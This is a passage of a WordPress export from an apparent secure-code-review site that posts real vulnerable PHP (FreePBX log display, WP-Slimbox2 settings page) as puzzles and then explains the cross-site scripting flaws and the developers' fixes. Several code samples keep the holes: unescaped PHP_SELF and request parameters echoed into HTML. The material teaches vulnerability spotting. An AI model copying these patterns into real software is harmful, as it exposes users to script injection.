		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>australia</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="avhec_catgroup" nicename="all"><![CDATA[All]]></category>
		<category domain="category" nicename="code-snippet"><![CDATA[Code Snippet]]></category>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[#secure #code #dev]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[2]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/dbgwfn]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[c874cf07cb1306781980dbf57165931b]]></wp:meta_value>
		</wp:postmeta>
		<wp:comment>
			<wp:comment_id>1044</wp:comment_id>
			<wp:comment_author><![CDATA[Cross-Site Scripting (XSS), FreePBX, PHP, Solution Vulnerability Code Example ~SpotTheVuln.com]]></wp:comment_author>
			<wp:comment_author_email></wp:comment_author_email>
			<wp:comment_author_url>http://spotthevuln.com/2010/11/australia-cross-site-scripting/</wp:comment_author_url>
			<wp:comment_author_IP>97.74.49.242</wp:comment_author_IP>
			<wp:comment_date>2010-11-26 17:19:18</wp:comment_date>
			<wp:comment_date_gmt>2010-11-27 00:19:18</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[[...] Australia [...] ]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type>pingback</wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
		</wp:comment>
	</item>
	<item>
		<title>Australia - Cross Site Scripting</title>
		<link>http://spotthevuln.com/2010/11/australia-cross-site-scripting/</link>
		<pubDate>Sat, 27 Nov 2010 00:19:13 +0000</pubDate>
		<dc:creator>bkrios</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=1216</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>Details</h2>
Affected Software: FreePBX

Fixed in Version: 2.5

Issue Type: Cross Site Scripting (XSS)

Original Code: <a title="Australia" href="http://spotthevuln.com/2010/11/australia/" target="_blank">Found    Here</a>
<h2>Description</h2>
One of the more weird XSS vulnerabilities I’ve seen :)
Here we see FreePBX using a potion of a log file in their HTML markup.  Specifically, the PHP code uses the system() API to execute a command on the PBX system.  The results of the system() command are printed to the HTML markup.  In this case, FreePBX runs a tail on a log file displaying some of the entries contained within that log file.  Looking at the vulnerable code sample, it is impossible to understand exactly what is contained in these log files, however it appears that HTML can exist in the log entries due to the sed command being run on the log file output:

<blockquote>| sed -e "s/$/&lt;br&gt;/"</blockquote>

The developers realized that the log files could contain other dangerous HTML elements and modified their sed command to try and filter those elements out.  Maybe a better approach would be to use a proper encoding API?  Luckily, it doesn’t seem like the attacker can control anything passed to system(), otherwise this would have been a code execution bug as opposed to just an XSS!

<h2>Developers Solution</h2>
[sourcecode language="diff"]
&lt;?php

$display = $_REQUEST['display'];
$type = isset($_REQUEST['type']) ? $_REQUEST['type'] : 'tool';
$action = isset($_REQUEST['action']) ? $_REQUEST['action'] : '';

?&gt;
&lt;/div&gt;
&lt;div class=&quot;content&quot;&gt;
&lt;?php

switch($action) {
	case 'showlog':
?&gt;
		&lt;h2&gt;
			&lt;?php echo sprintf(_('%s - last 2000 lines'),$amp_conf['ASTLOGDIR'].&quot;/full&quot;) ?&gt;
		&lt;/h2&gt;
		&lt;a href=&quot;config.php?&lt;?php echo &quot;display=$display&amp;type=$type&amp;action=showlog&quot;?&gt;&quot;&gt;&lt;?php echo _(&quot;Redisplay Asterisk Full debug log (last 2000 lines)&quot;) ?&gt;&lt;/a&gt;&lt;br&gt;
		&lt;hr&gt;&lt;br&gt;
		&lt;?php
-		echo system ('tail --line=2000 '.$amp_conf['ASTLOGDIR'].'/full | sed -e &quot;s/$/&lt;br&gt;/&quot;'); 
+		system ('tail --line=2000 '.$amp_conf['ASTLOGDIR'].'/full | sed -e &quot;s,&lt;,\&amp;lt;,g;s,&gt;,\&amp;gt;,g;s/$/&lt;br&gt;/&quot;'); 
		break;

	default:
		echo &quot;&lt;h2&gt;&quot;._(&quot;Asterisk Log Files&quot;).&quot;&lt;/h2&gt;&quot;;
?&gt;
				&lt;a href=&quot;config.php?&lt;?php echo &quot;display=$display&amp;type=$type&amp;action=showlog&quot;?&gt;&quot;&gt;&lt;?php echo _(&quot;Display Asterisk Full debug log (last 2000 lines)&quot;) ?&gt;&lt;/a&gt;&lt;br&gt;
				&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;
&lt;?php
    break;
}
?&gt;
&lt;/div&gt;
[/sourcecode] ]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1216</wp:post_id>
		<wp:post_date>2010-11-26 17:19:13</wp:post_date>
		<wp:post_date_gmt>2010-11-27 00:19:13</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>australia-cross-site-scripting</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="avhec_catgroup" nicename="all"><![CDATA[All]]></category>
		<category domain="post_tag" nicename="code-execution"><![CDATA[code execution]]></category>
		<category domain="post_tag" nicename="cross-site-scripting"><![CDATA[cross site scripting]]></category>
		<category domain="category" nicename="xss"><![CDATA[Cross-Site Scripting (XSS)]]></category>
		<category domain="post_tag" nicename="xss"><![CDATA[Cross-Site Scripting (XSS)]]></category>
		<category domain="post_tag" nicename="echo-system"><![CDATA[echo system]]></category>
		<category domain="category" nicename="freepbx"><![CDATA[FreePBX]]></category>
		<category domain="post_tag" nicename="freepbx-2"><![CDATA[freepbx]]></category>
		<category domain="post_tag" nicename="html-markup"><![CDATA[html markup]]></category>
		<category domain="post_tag" nicename="pbx-system"><![CDATA[pbx system]]></category>
		<category domain="category" nicename="php"><![CDATA[PHP]]></category>
		<category domain="post_tag" nicename="php-code"><![CDATA[php code]]></category>
		<category domain="category" nicename="solution"><![CDATA[Solution]]></category>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[#secure #code #dev]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[2]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_syntaxhighlighter_encoded</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/fTsAPp]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[aa0af7653b792551579a4dff518a0591]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[aa0af7653b792551579a4dff518a0591]]></wp:meta_value>
		</wp:postmeta>
		<wp:comment>
			<wp:comment_id>1050</wp:comment_id>
			<wp:comment_author><![CDATA[Wireghoul]]></wp:comment_author>
			<wp:comment_author_email>hacker@justanotherhacker.com</wp:comment_author_email>
			<wp:comment_author_url>http://www.justanotherhacker.com/tribalskull.jpg</wp:comment_author_url>
			<wp:comment_author_IP>203.58.120.11</wp:comment_author_IP>
			<wp:comment_date>2010-11-28 20:13:09</wp:comment_date>
			<wp:comment_date_gmt>2010-11-29 03:13:09</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[You missed one:
$display = $_REQUEST['display'];
&lt;a href=&quot;config.php?"&gt;</a>
&lt;a href=&quot;config.php?"&gt;</a>

Unfiltered output from $display = XSS]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type></wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
		</wp:comment>
		<wp:comment>
			<wp:comment_id>1187</wp:comment_id>
			<wp:comment_author><![CDATA[Brett Hardin]]></wp:comment_author>
			<wp:comment_author_email>hardin.brett+spotthevuln@gmail.com</wp:comment_author_email>
			<wp:comment_author_url>http://misc-security.com</wp:comment_author_url>
			<wp:comment_author_IP>216.10.193.22</wp:comment_author_IP>
			<wp:comment_date>2010-12-14 08:44:43</wp:comment_date>
			<wp:comment_date_gmt>2010-12-14 15:44:43</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[Thanks for pointing that out, however, It is not our fix. :)

The fixes that we show are the fixes the developers used. We never stated the fixes themselves don't have problems.]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type></wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>1</wp:comment_user_id>
			<wp:commentmeta>
				<wp:meta_key>akismet_result</wp:meta_key>
				<wp:meta_value><![CDATA[false]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:15:"1292341483.1266";s:7:"message";s:28:"Akismet cleared this comment";s:5:"event";s:9:"check-ham";s:4:"user";s:6:"BrettH";}]]></wp:meta_value>
			</wp:commentmeta>
		</wp:comment>
	</item>
	<item>
		<title>Haircut</title>
		<link>http://spotthevuln.com/2010/11/haircut/</link>
		<pubDate>Mon, 29 Nov 2010 15:00:10 +0000</pubDate>
		<dc:creator>bkrios</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=1223</guid>
		<description></description>
		<content:encoded><![CDATA[<blockquote><strong>I don't advise a hair cut man. All hairdressers are in the employment of the government. Hair are your aerials. They pick up signals from the cosmos and transmit them directly into the brain. This is the reason bald-headed men are uptight.</strong> <br><strong> - Bruce Robinson
</strong></blockquote>
<pre lang="php"><?php
	$easingArray = array(swing,easeInQuad,easeOutQuad,easeInOutQuad,easeInCubic,easeOutCubic,easeInOutCubic,easeInQuart,easeOutQuart,easeInOutQuart,easeInQuint,easeOutQuint,easeInOutQuint,easeInSine,easeOutSine,easeInOutSine,easeInExpo,easeOutExpo,easeInOutExpo,easeInCirc,easeOutCirc,easeInOutCirc,easeInElastic,easeOutElastic,easeInOutElastic,easeInBack,easeOutBack,easeInOutBack,easeInBounce,easeOutBounce,easeInOutBounce);
	$overlayOpacity = array(0,0.1,0.2,0.3,0.4,0.5,0.6,0.7,0.8,0.9,1);
	$msArray = array(1,100,200,300,400,500,600,700,800,900,1000);
	$captions = array('a-title','img-alt','img-title','href','None');
?>
<div class="wrap">
	<form method="post" action="<?php echo $_SERVER['PHP_SELF']?>?page=slimbox2options" id="options"><?php	echo wp_nonce_field('update-options','wp_slimbox_wpnonce'); ?><h2><?php _e('WP Slimbox2 Plugin', 'wp-slimbox2'); ?></h2>
<?php
	if(isset($_POST['action']) && wp_verify_nonce($_POST['wp_slimbox_wpnonce'], 'update-options')) {
		$options->update_option(
			array(
				'autoload'   => $_POST['wp_slimbox_autoload'],
				'loop' => $_POST['wp_slimbox_loop'],
				'overlayOpacity'   => $_POST['wp_slimbox_overlayOpacity'],
				'overlayColor' => $_POST['wp_slimbox_overlayColor'],
				'overlayFadeDuration'   => $_POST['wp_slimbox_overlayFadeDuration'],
				'resizeDuration' => $_POST['wp_slimbox_resizeDuration'],
				'resizeEasing'   => $_POST['wp_slimbox_resizeEasing'],
				'initialWidth' => $_POST['wp_slimbox_initialWidth'],
				'initialHeight'   => $_POST['wp_slimbox_initialHeight'],
				'imageFadeDuration' => $_POST['wp_slimbox_imageFadeDuration'],
				'captionAnimationDuration'   => $_POST['wp_slimbox_captionAnimationDuration'],
				'caption' => array($_POST['wp_slimbox_caption1'],$_POST['wp_slimbox_caption2'],$_POST['wp_slimbox_caption3'],$_POST['wp_slimbox_caption4']),
				'url' => $_POST['wp_slimbox_url'],
				'selector' => $_POST['wp_slimbox_selector'],
				'counterText' => $_POST['wp_slimbox_counterText'],
				'closeKeys'   => $_POST['wp_slimbox_closeKeys'],
				'previousKeys' => $_POST['wp_slimbox_previousKeys'],
				'nextKeys'   =>  $_POST['wp_slimbox_nextKeys'],
				'picasaweb' => $_POST['wp_slimbox_picasaweb'],
				'flickr'   => $_POST['wp_slimbox_flickr'],
				'mobile' => $_POST['wp_slimbox_mobile'],
				'maintenance' => $_POST['wp_slimbox_maintenance'],
				'cache'   => $_POST['wp_slimbox_cache']
			)
		);
		echo '<div id="message" class="updated fade"><p><strong>'.__('Settings Saved', 'wp-slimbox2').'.</strong></p></div>';
	}
	$caption = $options->get_option('caption');
	
	function selectionGen(&$option,&$array) {
		foreach($array as $key=> $ms) {
			$selected = ($option != $ms)? '' : ' selected';
			echo "<option value='$ms'$selected>".(($ms=='1'&&$array[0]!='0')?__('Disabled', 'wp-slimbox2'):$ms)."</option>\n";
		}
	}
?>
	<div style="clear:both;padding-top:5px;"></div>
		<h2><?php _e('Settings', 'wp-slimbox2');?></h2>
		<table class="widefat" cellspacing="0" id="inactive-plugins-table">
			<thead>
			<tr>
				<th scope="col" colspan="2"><?php _e('Setting', 'wp-slimbox2'); ?></th>
				<th scope="col"><?php _e('Description', 'wp-slimbox2'); ?></th>
			</tr>
			</thead>

			<tfoot>
			<tr>
				<th scope="col" colspan="3"><?php _e('Use the various options above to control some of the advanced settings of the plugin', 'wp-slimbox2'); ?></th>
			</tr>
			</tfoot>

			<tbody class="plugins">

			<tr class='inactive'>
				<td class='name'><?php _e('Autoload?', 'wp-slimbox2'); ?></td>
				<th scope='row' class='check-column'>
					<input type="checkbox" name="wp_slimbox_autoload"<?php if ($options->get_option('autoload') == 'on') echo ' checked="yes"';?> />
				</th>
				<td class='desc'>
					<p> <?php _e('This option allows the user to automatically activate Slimbox on all links pointing to ".jpg", ".jpeg", ".png", ".bmp" or ".gif". All image links will automatically be grouped together in a gallery according to the selector chosen below. If this isn\'t activated you will need to manually add <b><code>rel="lightbox"</code></b> for individual images or <b><code>rel="lightbox-imagesetname"</code></b> for groups on all links you wish to use the Slimbox effect. <b>Default is Disabled.</b>', 'wp-slimbox2'); ?>
					</p>
				</td>
			</tr>
			<tr class='inactive'>
				<td class='name'><?php _e('Enable Picasaweb Integration?', 'wp-slimbox2'); ?></td>
				<th scope='row' class='check-column'>
					<input type="checkbox" name="wp_slimbox_picasaweb"<?php if ($options->get_option('picasaweb') == 'on') echo ' checked="yes"';?> />
				</th>
				<td class='desc'>
					<p> <?php _e('This option allows the user to automatically add the Slimbox effect to Picasaweb links when provided an appropriate url (this is separate from the autoload script which only functions on direct image links). <b>Default is Disabled.</b>', 'wp-slimbox2'); ?>
					</p>
				</td>
			</tr>
			<tr class='inactive'>
				<td class='name'><?php _e('Enable Flickr Integration?', 'wp-slimbox2'); ?></td>
				<th scope='row' class='check-column'>
					<input type="checkbox" name="wp_slimbox_flickr"<?php if ($options->get_option('flickr') == 'on') echo ' checked="yes"';?> />
				</th>
				<td class='desc'>
					<p> <?php _e('This option allows the user to automatically add the Slimbox effect to Flickr links when provided an appropriate url (this is separate from the autoload script which only functions on direct image links). <b>Default is Disabled.</b>', 'wp-slimbox2'); ?>
					</p>
				</td>
			</tr>
			<tr class='inactive'>
				<td class='name'><?php _e('Loop?', 'wp-slimbox2'); ?></td>
				<th scope='row' class='check-column'>
					<input type="checkbox" name="wp_slimbox_loop"<?php if ($options->get_option('loop') == 'on') echo ' checked="yes"';?> />
				</th>
				<td class='desc'>
					<p> <?php _e('This option allows the user to navigate between the first and last images of a Slimbox gallery group when there is more than one image to display. <b>Default is Disabled.</b>', 'wp-slimbox2'); ?>
					</p>
				</td>
			</tr>
			<tr class='inactive'>
				<td class='name'><?php _e('Overlay Opacity', 'wp-slimbox2'); ?></td>
				<th scope='row' class='check-column'>
					<select name="wp_slimbox_overlayOpacity">
					<?php selectionGen($options->get_option('overlayOpacity'),$overlayOpacity); ?>
					</select>
				</th>
				<td class='desc'>
					<p> <?php _e('This option allows the user to adjust the opacity of the background overlay. 1 is completely opaque, 0 is completely transparent. <b>Default is 0.8.</b>', 'wp-slimbox2'); ?>
					</p>
				</td>
			</tr>
			<tr class='inactive'>
				<td class='name'><?php _e('Overlay Color', 'wp-slimbox2'); ?></td>
				<th scope='row' class='check-column'>
					<input type="text" id="wp_slimbox_overlayColor" name="wp_slimbox_overlayColor" value="<?php echo $options->get_option('overlayColor'); ?>" size="7" maxlength="7"/><div id="picker"></div>

				</th>
				<td class='desc'>
					<p> <?php _e('This option allows the user to set the color of the overlay by selecting your hue from the circle and color gradient from the square. Alternatively you may manually enter a valid HTML color code. The color of the entry field will change to reflect your selected color. <b>Default is #000000.</b>', 'wp-slimbox2'); ?>
					</p>
				</td>
			</tr>
			<tr class='inactive'>
				<td class='name'><?php _e('Overlay Fade Duration', 'wp-slimbox2'); ?></td>
				<th scope='row' class='check-column'>
					<select name="wp_slimbox_overlayFadeDuration">
					<?php selectionGen($options->get_option('overlayFadeDuration'),$msArray); ?>
					</select>
				</th>
				<td class='desc'>
					<p> <?php _e('This option allows the user to adjust the duration of the overlay fade-in and fade-out animations, in milliseconds. <b>Default is 400.</b>', 'wp-slimbox2'); ?>
					</p>
				</td>
			</tr>
			<tr class='inactive'>
				<td class='name'><?php _e('Resize Duration', 'wp-slimbox2'); ?></td>
				<th scope='row' class='check-column'>
					<select name="wp_slimbox_resizeDuration">
					<?php selectionGen($options->get_option('resizeDuration'),$msArray); ?>
					</select>
				</th>
				<td class='desc'>
					<p> <?php _e('This option allows the user to adjust the duration of the resize animation for width and height, in milliseconds. <b>Default is 400.</b>', 'wp-slimbox2'); ?>
					</p>
				</td>
			</tr>
</pre>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1223</wp:post_id>
		<wp:post_date>2010-11-29 08:00:10</wp:post_date>
		<wp:post_date_gmt>2010-11-29 15:00:10</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>haircut</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="avhec_catgroup" nicename="all"><![CDATA[All]]></category>
		<category domain="category" nicename="code-snippet"><![CDATA[Code Snippet]]></category>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[#secure #code #dev]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[2]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_shortUrl</wp:meta_key>
			<wp:meta_value><![CDATA[http://bit.ly/h5WHzu]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_sexybookmarks_permaHash</wp:meta_key>
			<wp:meta_value><![CDATA[4cc4d7719229313eef6f2397d02cae18]]></wp:meta_value>
		</wp:postmeta>
		<wp:comment>
			<wp:comment_id>1099</wp:comment_id>
			<wp:comment_author><![CDATA[Cross-Site Scripting (XSS), PHP, Solution, Wordpress Vulnerability Code Example ~SpotTheVuln.com]]></wp:comment_author>
			<wp:comment_author_email></wp:comment_author_email>
			<wp:comment_author_url>http://spotthevuln.com/2010/12/haircut-cross-site-scripting/</wp:comment_author_url>
			<wp:comment_author_IP>97.74.49.242</wp:comment_author_IP>
			<wp:comment_date>2010-12-03 08:02:09</wp:comment_date>
			<wp:comment_date_gmt>2010-12-03 15:02:09</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[[...] Haircut [...] ]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type>pingback</wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
		</wp:comment>
	</item>
	<item>
		<title>Haircut - Cross Site Scripting</title>
		<link>http://spotthevuln.com/2010/12/haircut-cross-site-scripting/</link>
		<pubDate>Fri, 03 Dec 2010 15:00:40 +0000</pubDate>
		<dc:creator>bkrios</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=1228</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>Details</h2>
Affected Software: WP-Slimbox 2

Fixed in Version: 1.0.1

Issue Type: Cross Site Scripting (XSS)

Original Code: <a title="Haircut" href="http://spotthevuln.com/2010/11/haircut/" target="_blank">Found    Here</a>
<h2>Description</h2>
A bit of a head fake here.  There are a lot of variable assignments in this code.  Lots of variable assignments results in a lot of tracing during security code audits.  As a variable is set with an untrusted value, it becomes tainted.  Following that variable until you find exactly where its being used is crucial in understanding whether a security bug exists or not.  Any one of those variable assignments could easily result in a major security vulnerability.  In this week’s example, the vulnerable line came before the massive set of variable assignments.  Once again, we see PHP_SELF being used to create a URL.  Instead of trying to encode the value before using it in markup, the developer chose to remove the reference to PHP_SELF.

<h2>Developers Solution</h2>
[sourcecode language="diff" highlight="8,9"]
&lt;?php
	$easingArray = array(swing,easeInQuad,easeOutQuad,easeInOutQuad,easeInCubic,easeOutCubic,easeInOutCubic,easeInQuart,easeOutQuart,easeInOutQuart,easeInQuint,easeOutQuint,easeInOutQuint,easeInSine,easeOutSine,easeInOutSine,easeInExpo,easeOutExpo,easeInOutExpo,easeInCirc,easeOutCirc,easeInOutCirc,easeInElastic,easeOutElastic,easeInOutElastic,easeInBack,easeOutBack,easeInOutBack,easeInBounce,easeOutBounce,easeInOutBounce);
	$overlayOpacity = array(0,0.1,0.2,0.3,0.4,0.5,0.6,0.7,0.8,0.9,1);
	$msArray = array(1,100,200,300,400,500,600,700,800,900,1000);
	$captions = array('a-title','img-alt','img-title','href','None');
?&gt;
&lt;div class=&quot;wrap&quot;&gt;
-	&lt;form method=&quot;post&quot; action=&quot;&lt;?php echo $_SERVER['PHP_SELF']?&gt;?page=slimbox2options&quot; id=&quot;options&quot;&gt;&lt;?php	echo wp_nonce_field('update-options','wp_slimbox_wpnonce'); ?&gt;&lt;h2&gt;&lt;?php _e('WP Slimbox2 Plugin', 'wp-slimbox2'); ?&gt;&lt;/h2&gt;
+ 	&lt;form method=&quot;post&quot; action=&quot;&quot; id=&quot;options&quot;&gt;&lt;?php      echo wp_nonce_field('update-options','wp_slimbox_wpnonce'); ?&gt;&lt;h2&gt;&lt;?php _e('WP Slimbox2 Plugin', 'wp-slimbox2'); ?&gt;&lt;/h2&gt; 
&lt;?php
	if(isset($_POST['action']) &amp;&amp; wp_verify_nonce($_POST['wp_slimbox_wpnonce'], 'update-options')) {
		$options-&gt;update_option(
			array(
				'autoload'   =&gt; $_POST['wp_slimbox_autoload'],
				'loop' =&gt; $_POST['wp_slimbox_loop'],
				'overlayOpacity'   =&gt; $_POST['wp_slimbox_overlayOpacity'],
				'overlayColor' =&gt; $_POST['wp_slimbox_overlayColor'],
				'overlayFadeDuration'   =&gt; $_POST['wp_slimbox_overlayFadeDuration'],
				'resizeDuration' =&gt; $_POST['wp_slimbox_resizeDuration'],
				'resizeEasing'   =&gt; $_POST['wp_slimbox_resizeEasing'],
				'initialWidth' =&gt; $_POST['wp_slimbox_initialWidth'],
				'initialHeight'   =&gt; $_POST['wp_slimbox_initialHeight'],
				'imageFadeDuration' =&gt; $_POST['wp_slimbox_imageFadeDuration'],
				'captionAnimationDuration'   =&gt; $_POST['wp_slimbox_captionAnimationDuration'],
				'caption' =&gt; array($_POST['wp_slimbox_caption1'],$_POST['wp_slimbox_caption2'],$_POST['wp_slimbox_caption3'],$_POST['wp_slimbox_caption4']),
				'url' =&gt; $_POST['wp_slimbox_url'],
				'selector' =&gt; $_POST['wp_slimbox_selector'],
				'counterText' =&gt; $_POST['wp_slimbox_counterText'],
				'closeKeys'   =&gt; $_POST['wp_slimbox_closeKeys'],
				'previousKeys' =&gt; $_POST['wp_slimbox_previousKeys'],
				'nextKeys'   =&gt;  $_POST['wp_slimbox_nextKeys'],
				'picasaweb' =&gt; $_POST['wp_slimbox_picasaweb'],
				'flickr'   =&gt; $_POST['wp_slimbox_flickr'],
				'mobile' =&gt; $_POST['wp_slimbox_mobile'],
				'maintenance' =&gt; $_POST['wp_slimbox_maintenance'],
				'cache'   =&gt; $_POST['wp_slimbox_cache']
			)
		);
		echo '&lt;div id=&quot;message&quot; class=&quot;updated fade&quot;&gt;&lt;p&gt;&lt;strong&gt;'.__('Settings Saved', 'wp-slimbox2').'.&lt;/strong&gt;&lt;/p&gt;&lt;/div&gt;';
	}
	$caption = $options-&gt;get_option('caption');
	
	function selectionGen(&amp;$option,&amp;$array) {
		foreach($array as $key=&gt; $ms) {
			$selected = ($option != $ms)? '' : ' selected';
			echo &quot;&lt;option value='$ms'$selected&gt;&quot;.(($ms=='1'&amp;&amp;$array[0]!='0')?__('Disabled', 'wp-slimbox2'):$ms).&quot;&lt;/option&gt;\n&quot;;
		}
	}
?&gt;
	&lt;div style=&quot;clear:both;padding-top:5px;&quot;&gt;&lt;/div&gt;
		&lt;h2&gt;&lt;?php _e('Settings', 'wp-slimbox2');?&gt;&lt;/h2&gt;
		&lt;table class=&quot;widefat&quot; cellspacing=&quot;0&quot; id=&quot;inactive-plugins-table&quot;&gt;
			&lt;thead&gt;
			&lt;tr&gt;
				&lt;th scope=&quot;col&quot; colspan=&quot;2&quot;&gt;&lt;?php _e('Setting', 'wp-slimbox2'); ?&gt;&lt;/th&gt;
				&lt;th scope=&quot;col&quot;&gt;&lt;?php _e('Description', 'wp-slimbox2'); ?&gt;&lt;/th&gt;
			&lt;/tr&gt;
			&lt;/thead&gt;

			&lt;tfoot&gt;
			&lt;tr&gt;
				&lt;th scope=&quot;col&quot; colspan=&quot;3&quot;&gt;&lt;?php _e('Use the various options above to control some of the advanced settings of the plugin', 'wp-slimbox2'); ?&gt;&lt;/th&gt;
			&lt;/tr&gt;
			&lt;/tfoot&gt;

			&lt;tbody class=&quot;plugins&quot;&gt;

			&lt;tr class='inactive'&gt;
				&lt;td class='name'&gt;&lt;?php _e('Autoload?', 'wp-slimbox2'); ?&gt;&lt;/td&gt;
				&lt;th scope='row' class='check-column'&gt;
					&lt;input type=&quot;checkbox&quot; name=&quot;wp_slimbox_autoload&quot;&lt;?php if ($options-&gt;get_option('autoload') == 'on') echo ' checked=&quot;yes&quot;';?&gt; /&gt;
				&lt;/th&gt;
				&lt;td class='desc'&gt;
					&lt;p&gt; &lt;?php _e('This option allows the user to automatically activate Slimbox on all links pointing to &quot;.jpg&quot;, &quot;.jpeg&quot;, &quot;.png&quot;, &quot;.bmp&quot; or &quot;.gif&quot;. All image links will automatically be grouped together in a gallery according to the selector chosen below. If this isn\'t activated you will need to manually add &lt;b&gt;&lt;code&gt;rel=&quot;lightbox&quot;&lt;/code&gt;&lt;/b&gt; for individual images or &lt;b&gt;&lt;code&gt;rel=&quot;lightbox-imagesetname&quot;&lt;/code&gt;&lt;/b&gt; for groups on all links you wish to use the Slimbox effect. &lt;b&gt;Default is Disabled.&lt;/b&gt;', 'wp-slimbox2'); ?&gt;
					&lt;/p&gt;
				&lt;/td&gt;
			&lt;/tr&gt;
			&lt;tr class='inactive'&gt;
				&lt;td class='name'&gt;&lt;?php _e('Enable Picasaweb Integration?', 'wp-slimbox2'); ?&gt;&lt;/td&gt;
				&lt;th scope='row' class='check-column'&gt;
					&lt;input type=&quot;checkbox&quot; name=&quot;wp_slimbox_picasaweb&quot;&lt;?php if ($options-&gt;get_option('picasaweb') == 'on') echo ' checked=&quot;yes&quot;';?&gt; /&gt;
				&lt;/th&gt;
				&lt;td class='desc'&gt;
